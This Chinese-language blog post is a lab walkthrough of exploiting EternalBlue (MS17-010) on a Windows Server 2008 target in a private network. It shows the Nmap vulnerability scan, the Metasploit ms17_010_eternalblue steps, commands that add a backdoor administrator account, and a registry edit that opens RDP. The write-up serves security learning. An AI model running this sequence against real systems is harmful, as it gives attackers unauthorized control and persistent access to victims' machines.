<!DOCTYPE html><html lang="en-us"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>永恒之蓝攻击靶场 | FyJIANCHI</title><meta name="description"><meta name="generator" content="FyJIANCHI"><meta name="author" content="John Doe"><meta name="keywords" content="sjaak van den berg, svdb, bitcoin, crypto, payment, integration, bitcoins, wordpress, betaling, webshop, front end, design, ontwerp, developer"><meta name="HandheldFriendly" content="True"><meta name="MobileOptimized" content="320"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=0"><link rel="stylesheet" type="text/css" href="/styles/screen.css"><link rel="apple-touch-icon" sizes="57x57" href="/images/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/images/apple-touch-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/images/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/images/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/images/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/images/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/images/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/images/apple-touch-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-180x180.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/images/favicon-96x96.png"><link rel="icon" type="image/png" sizes="160x160" href="/images/favicon-160x160.png"><link rel="icon" type="image/png" sizes="192x192" href="/images/favicon-192x192.png"><meta name="msapplication-TileColor" content="#121315"><meta name="msapplication-TileImage" content="/images/mstile-144x144.png"></head><body itemscope itemtype="https://schema.org/WebPage"><header itemscope itemtype="https://schema.org/WPHeader"><a href="/"><img src="/images/svdb.png" alt="FyJIANCHI" title="FyJIANCHI"></a><h1><a href="/" alt="FyJIANCHI" title="FyJIANCHI" itemprop="headline">FyJIANCHI</a></h1><p itemprop="description">Loneliness does not mean loneliness</p><nav itemscope itemtype="https://schema.org/SiteNavigationElement"><ul><li itemprop="name"><a href="/Home" alt="Home" title="Home" itemprop="url">Home</a></li><li itemprop="name"><a href="/Article" alt="Article" title="Article" itemprop="url">Article</a></li><li itemprop="name"><a href="/about" alt="About" title="About" itemprop="url">About</a></li></ul></nav><div class="space"></div></header><main itemscope itemtype="https://schema.org/Blog"><article class="full"><h1 itemprop="headline">永恒之蓝攻击靶场</h1><span class="post-meta">Published on<time itemprop="datePublished" datetime="2019-03-23T09:19:34.000Z"> Saturday, March 23rd 2019 at 17:19</time><br>Last updated on<time itemprop="dateModified" datetime="2019-03-23T09:19:34.000Z"> Sunday, March 24th 2019 at 16:02</time></span><hr>
<h1 id="永恒之蓝介绍"><a href="#永恒之蓝介绍" class="headerlink" title="永恒之蓝介绍"></a>永恒之蓝介绍</h1><p>​      1.恶意代码会扫描开放445和139文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和<a href="https://www.baidu.com/s?wd=%E6%9C%8D%E5%8A%A1%E5%99%A8&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd" target="_blank" rel="noopener">服务器</a>中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
<p>​       2.漏洞是在<a href="https://baike.baidu.com/item/%E7%A1%AC%E4%BB%B6/479446" target="_blank" rel="noopener">硬件</a>、<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053" target="_blank" rel="noopener">软件</a>、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的<a href="https://baike.baidu.com/item/%E6%83%85%E5%86%B5/1392364" target="_blank" rel="noopener">情况</a>下访问或破坏系统。具体举例来说，比如在Intel Pentium芯片中存在的逻辑错误，在Sendmail早期版本中的<a href="https://baike.baidu.com/item/%E7%BC%96%E7%A8%8B/139828" target="_blank" rel="noopener">编程</a>错误，在NFS协议中认证方式上的弱点，在Unix<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98" target="_blank" rel="noopener">系统管理员</a>设置匿名Ftp服务时配置不当的问题都可能被攻击者使用，威胁到系统的安全。因而这些都可以认为是系统中存在的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/2890124" target="_blank" rel="noopener">安全漏洞</a>。</p>
<a id="more"></a>
<h2 id="1、-漏洞与具体系统环境之间的关系及其时间相关特性"><a href="#1、-漏洞与具体系统环境之间的关系及其时间相关特性" class="headerlink" title="1、 漏洞与具体系统环境之间的关系及其时间相关特性"></a><strong>1、 漏洞与具体系统环境之间的关系及其时间相关特性</strong></h2><p>​        漏洞会影响到很大范围的软<a href="https://baike.baidu.com/item/%E7%A1%AC%E4%BB%B6" target="_blank" rel="noopener">硬件</a>设备，包括作系统本身及其支撑<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6" target="_blank" rel="noopener">软件</a>，网络客户和<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BD%AF%E4%BB%B6" target="_blank" rel="noopener">服务器软件</a>，<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%B7%AF%E7%94%B1%E5%99%A8" target="_blank" rel="noopener">网络路由器</a>和安全<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99" target="_blank" rel="noopener">防火墙</a>等。换而言之，在这些不同的软<a href="https://baike.baidu.com/item/%E7%A1%AC%E4%BB%B6" target="_blank" rel="noopener">硬件</a>设备中都可能存在不同的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">安全漏洞</a>问题。在不同种类的软、<a href="https://baike.baidu.com/item/%E7%A1%AC%E4%BB%B6" target="_blank" rel="noopener">硬件</a>设备，同种设备的不同版本之间，由不同设备构成的不同系统之间，以及同种系统在不同的设置条件下，都会存在各自不同的<a href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">安全漏洞</a>问题。</p>
<h2 id="2、漏洞的危害及防范"><a href="#2、漏洞的危害及防范" class="headerlink" title="2、漏洞的危害及防范"></a><strong>2、漏洞的危害及防范</strong></h2><p>漏洞的存在，很容易导致<a href="https://baike.baidu.com/item/%E9%BB%91%E5%AE%A2" target="_blank" rel="noopener">黑客</a>的侵入及病毒的驻留，会导致数据丢失和篡改、隐私泄露乃至金钱上的损失，如：网站因漏洞被入侵，网站用户数据将会泄露、网站功能可能遭到破坏而中止乃至服务器本身被入侵者控制。目前数码产品发展，漏洞从过去以电脑为载体延伸至数码平台，如手机<a href="https://baike.baidu.com/item/%E4%BA%8C%E7%BB%B4%E7%A0%81" target="_blank" rel="noopener">二维码</a>漏洞，<a href="https://baike.baidu.com/item/%E5%AE%89%E5%8D%93" target="_blank" rel="noopener">安卓</a><a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F" target="_blank" rel="noopener">应用程序</a>漏洞等等…</p>
<h1 id="使用Nmap对漏洞进行扫描"><a href="#使用Nmap对漏洞进行扫描" class="headerlink" title="使用Nmap对漏洞进行扫描"></a><strong>使用Nmap对漏洞进行扫描</strong></h1><h2 id="1-Nmap的简介"><a href="#1-Nmap的简介" class="headerlink" title="1. Nmap的简介"></a>1. Nmap的简介</h2><p>​       Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。</p>
<h2 id="2-Nmap的功能"><a href="#2-Nmap的功能" class="headerlink" title="2. Nmap的功能"></a>2. Nmap的功能</h2><p>​       其基本功能有三个，一是探测一组主机是否在线；其次是扫描 主机端口，<a href="https://baike.baidu.com/item/%E5%97%85%E6%8E%A2" target="_blank" rel="noopener">嗅探</a>所提供的网络服务；还可以推断主机所用的操作系统 。Nmap可用于扫描仅有两个节点的LAN，直至500个节点以上的网络。Nmap 还允许用户定制扫描技巧。通常，一个简单的使用<a href="https://baike.baidu.com/item/ICMP%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">ICMP协议</a>的ping操作可以满足一般需求；也可以深入探测UDP或者TCP端口，直至<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA" target="_blank" rel="noopener">主机</a>所 使用的操作系统；还可以将所有探测结果记录到各种格式的日志中， 供进一步分析操作。</p>
<h2 id="3、环境搭建"><a href="#3、环境搭建" class="headerlink" title="3、环境搭建"></a><strong>3、环境搭建</strong></h2><p>目标靶机：windows2008Server(存在MS17_010漏洞)</p>
<p><a href="https://www.baidu.com/s?wd=%E6%93%8D%E4%BD%9C%E6%9C%BA&amp;tn=24004469_oem_dg&amp;rsv_dl=gh_pl_sl_csd" target="_blank" rel="noopener">操作机</a>系统：Kali linux</p>
<p>攻击机IP:192.168.28.136</p>
<p>靶机IP: 192.168.28.128  windows server 2008</p>
<h3 id="3-1-在本地查找ms17-010"><a href="#3-1-在本地查找ms17-010" class="headerlink" title="3.1 在本地查找ms17-010"></a>3.1 在本地查找ms17-010</h3><img src="/2019/03/23/New-Page-1/nmap1.png">
<p><img src="G:\hexo\source\_posts\New-Page-1\nmap1.png" alt></p>
<h3 id="3-2-使用nmap对靶机进行扫描"><a href="#3-2-使用nmap对靶机进行扫描" class="headerlink" title="3.2 使用nmap对靶机进行扫描"></a>3.2 使用nmap对靶机进行扫描</h3><p>输入命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/nmap/scripts# nmap --script smb-vuln-ms17-010 192.168.28.128</span><br></pre></td></tr></table></figure>
<img src="/2019/03/23/New-Page-1/nmap2.jpg">
<p><img src="G:\hexo\source\_posts\New-Page-1\nmap2.jpg" alt></p>
<h3 id="3-3-使用Metasploit对目标进行监听"><a href="#3-3-使用Metasploit对目标进行监听" class="headerlink" title="3.3 使用Metasploit对目标进行监听"></a>3.3 使用Metasploit对目标进行监听</h3><p>输入<code>msfconsole</code>启动Metasploit<br>在Metasploit中，输入<code>search ms17-010</code>查找永恒之蓝漏洞</p>
<img src="/2019/03/23/New-Page-1/mete.png">
<p><img src="G:\hexo\source\_posts\New-Page-1\mete.png" alt></p>
<p>输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>执行漏洞<br>输入<code>show options</code>查看当前攻击配置</p>

<p><img src="G:\hexo\source\_posts\New-Page-1\mete1.jpg" alt></p>
<p>将配置中第一行的<code>RHOST</code>修改为靶机IP地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.28.128</span><br></pre></td></tr></table></figure>
<p>修改完查看配置，配置完成后，使用 <code>run</code> 命令直接执行。</p>

<p><img src="G:\hexo\source\_posts\New-Page-1\mete3.jpg" alt></p>
<p>在命令中直接可以输入<code>whoami</code>当前登录的用户</p>
<h3 id="3-4-在靶机创建用户并赋予管理员权限"><a href="#3-4-在靶机创建用户并赋予管理员权限" class="headerlink" title="3.4 在靶机创建用户并赋予管理员权限"></a>3.4 在靶机创建用户并赋予管理员权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure>
<h3 id="3-5-开启3389端口并使用远程桌面登录"><a href="#3-5-开启3389端口并使用远程桌面登录" class="headerlink" title="3.5 开启3389端口并使用远程桌面登录"></a>3.5 开启3389端口并使用远程桌面登录</h3><p>在命令行中输入<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code>并执行，即可打开3389端口 ，此时我们新建一个终端，输入<code>rdesktop 192.168.28.128</code>登录远程桌面。</p>
<img src="/2019/03/23/New-Page-1/rdesktop.jpg">
<p><img src="G:\hexo\source\_posts\New-Page-1\rdesktop.jpg" alt></p>
<p>此时我们选择其他用户并使用刚才创建的用户登录，稍等便能登录到Windows桌面了。</p>
</article></main></body></html>